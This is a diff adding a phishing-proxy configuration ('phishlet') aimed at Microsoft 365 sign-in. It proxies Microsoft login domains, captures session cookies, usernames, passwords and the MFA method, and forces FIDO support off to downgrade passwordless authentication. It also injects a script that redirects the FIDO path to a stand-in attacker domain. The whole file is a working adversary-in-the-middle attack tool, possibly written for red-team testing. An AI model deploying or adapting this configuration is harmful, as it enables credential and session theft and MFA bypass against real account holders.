@@ -1,0 +1,91 @@
+name: 'o365whfb'
+author: 'Yehuda Smirnov'
+min_ver: '3.1.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always','ESTSAUTHPERSISTENT:always','SignInStateCookie:always','esctx:always','ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/GetCredentialType'
+    search:
+      - {key: 'isFidoSupported', search: '.*'}
+    force:
+      - {key: 'isFidoSupported', value: 'false'}
+    type: 'post'
+auth_urls:
+  - "/kmsi*"
+  - "/favicon.ico"
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+  username:
+    key: ""
+    search: '"username":"([^"]*)'
+    type: "json"
+  password:
+    key: ""
+    search: '"password":"([^"]*)'
+    type: "json"
+  username:
+    key: (login|UserName|username|email|account)
+    search: (.*)
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: (.*)
+  username:
+    key: '(login)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/.*"]
+    trigger_params: ["true"]
+    script: |
+      function lp(){
+        var element = document.querySelector('.table');
+        console.log("loaded")
+        if (element) {
+          element.style.display = 'none';
+          };
+        if (window.location.pathname == '/common/fido/get' && !loc) {
+          console.log("success");
+          location.replace('https://login.attacker_domain.com/');
+          loc = true;
+          }
+        if (window.location.pathname != '/common/fido/get' && loc) {
+          loc = false;
+          }
+        setTimeout(function(){lp();}, 100);
+        }
+      let loc = false;
+      setTimeout(function(){lp();}, 100);
